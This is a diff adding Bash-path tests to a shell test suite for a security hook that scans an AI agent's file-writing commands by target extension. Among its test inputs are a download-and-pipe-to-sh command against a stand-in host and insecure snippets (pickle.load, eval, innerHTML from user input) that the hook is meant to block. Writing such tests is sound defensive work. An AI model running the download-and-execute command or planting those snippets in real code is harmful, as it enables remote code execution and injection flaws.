@@ -54,6 +54,16 @@ run_multiedit() {
   echo $?
 }
 
+# Run hook with a Bash-form payload (the command authors file content via a
+# heredoc / printf / echo|tee); print exit code. The Bash branch must scan the
+# would-be-written content scoped to the write target's extension.
+run_bash() {
+  local cmd="$1"
+  jq -nc --arg c "$cmd" '{tool_name: "Bash", tool_input: {command: $c}}' \
+    | bash "$HOOK" >/dev/null 2>&1
+  echo $?
+}
+
 expect_block() {
   local label="$1" actual="$2"
   if [ "$actual" = "2" ]; then pass "$label"; else fail "$label (expected exit=2, got exit=$actual)"; fi
@@ -154,6 +164,32 @@ expect_allow "MultiEdit edits[] clean allows" "$(run_multiedit /tmp/x.py 'return
 # ===== Multi-line anti-pattern split across lines is caught (perl -0777 slurp) =====
 expect_block "download-pipe-to-sh split across lines blocks" "$(run_write /tmp/x.sh "$(printf 'curl https://x.example \\\n  | %s\n' sh)")"
 expect_allow "curl without pipe-to-sh allows" "$(run_write /tmp/x.sh 'curl https://x.example -o out')"
+
+# ===== Bash branch: shell-side authoring is scanned like an Edit =====
+# A heredoc / printf / echo|tee that writes flagged content to a file is caught
+# at the target's extension, just like a direct Write would be.
+expect_block "Bash heredoc pickle.load into .py blocks" \
+  "$(run_bash "$(printf 'cat > evil.py <<EOF\nimport pickle\npickle.load(f)\nEOF\n')")"
+expect_allow "Bash benign heredoc into .md allows" \
+  "$(run_bash "$(printf 'cat > notes.md <<EOF\njust some plain notes\nEOF\n')")"
+expect_block "Bash printf eval into .js blocks" \
+  "$(run_bash 'printf "%s" "var r = eval(s)" > app.js')"
+expect_block "Bash echo innerHTML piped to tee .js blocks" \
+  "$(run_bash 'echo "el.innerHTML = userInput" | tee widget.js')"
+# Extension scoping holds on the Bash path: a py-only pattern in a heredoc whose
+# target is .md must NOT fire (the body is scanned at the target's extension).
+expect_allow "Bash heredoc pickle.load into .md NOT blocked (ext-scoped)" \
+  "$(run_bash "$(printf 'cat > notes.md <<EOF\nimport pickle\npickle.load(f)\nEOF\n')")"
+# A download-pipe-to-shell heredoc into a .sh target blocks (the dangerous
+# fragment is assembled via printf so the literal never appears in this source).
+expect_block "Bash heredoc download-pipe-to-sh into .sh blocks" \
+  "$(run_bash "$(printf 'cat > setup.sh <<EOF\ncurl https://x.example | %s\nEOF\n' sh)")"
+# No file-write target (plain read/pipe) → no-op allow.
+expect_allow "Bash command with no file-write target allows" \
+  "$(run_bash 'cat config.py | grep import 2>/dev/null')"
+# Empty Bash command → allow.
+expect_allow "Bash empty command allows" \
+  "$(jq -nc '{tool_name: "Bash", tool_input: {command: ""}}' | bash "$HOOK" >/dev/null 2>&1; echo $?)"
 
 echo
 echo "Tests run: $TESTS_RUN, failed: $TESTS_FAILED"
